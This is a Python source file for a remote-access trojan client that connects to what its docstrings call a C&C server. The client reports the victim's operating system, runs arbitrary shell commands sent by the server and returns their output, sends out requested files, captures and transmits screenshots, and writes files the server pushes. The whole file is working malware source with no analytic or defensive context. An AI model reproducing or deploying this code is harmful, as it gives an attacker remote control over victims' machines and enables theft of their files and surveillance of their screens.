import socket
import os
import subprocess
import struct
import base64
import io
import time
import re
from PIL import ImageGrab

class Client:
    """A class representing the client that connects to the server via sockets.

    Attributes:
        host (str): The IP address of the remote C&C server
        port (int): The port to connect to the remote C&C server
    """

    def __init__(self, ip, port):
        """Initializes a new instance of the Client class.

        Args:
        ip (str): The IP address of the remote C&C server
        port (int): The port to connect to the remote C&C server
        """
        self.host = ip
        self.port = port
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def makeConnection(self):
        """
        Initializes the connection to the C&C Server, and sends client OS to the server
        """

        self.server_socket.connect((self.host, self.port))

        #Send client OS
        if os.name == 'nt':
            self.server_socket.send(b'WIN')
        elif os.name == 'posix':
            self.server_socket.send(b'LIN')


    def quitConnection(self):
        """
        Close the connection to the C&C Server
        """

        self.server_socket.close()

    def listenForCommands(self):
        data = self.server_socket.recv(1024)

        if not data:
            print("Connection to server has been closed")
            exit(1)

        if data.startswith(b"command"):
            command = data[7:].decode()
            self.executeAndSend(command)

        if data.startswith(b"download"):
            file = data[8:].decode()
            self.server_socket.settimeout(None)
            with open(file, 'rb') as f:
                data = f.read()
                self.server_socket.sendall(data)


        if data.startswith(b"netstat"):
            self.executeAndSend('netstat -nat')

        if data.startswith(b"interfaces"):
            if os.name == 'nt':
                self.executeAndSend('ipconfig')
            elif os.name == 'posix':
                self.executeAndSend('ifconfig')

        if data.startswith(b"screenshot"):
            # Take a screenshot and save it as PNG
            screenshot = ImageGrab.grab()
            buffer = io.BytesIO()
            screenshot.save(buffer, format='PNG')
            buffer.seek(0)

            #Send screenshot
            self.server_socket.sendall(buffer.read())


        if data.startswith(b"upload"):
            start_str = b"upload"
            end_str = b"FILE_START"
            start_index = data.find(start_str)
            end_index = data.find(end_str)
            path = data[start_index + len(start_str):end_index].decode()

            print(path)

            contents = data[end_index+len(end_str):]
            self.server_socket.settimeout(2)
            with open(path, 'wb') as f:
                f.write(contents)
                while True:
                    try:
                        chunk = self.server_socket.recv(1024)
                        if not chunk:
                            break
                        f.write(chunk)
                    except:
                        self.server_socket.settimeout(None)
                        f.close()
                        return
                self.server_socket.settimeout(None)
                f.close()
                return

    def executeAndSend(self, command):
        output = os.popen(command).read()
        print(output)
        self.server_socket.send(output.encode('utf-8'))

    def start(self):
        self.makeConnection()
        while True:
            self.listenForCommands()

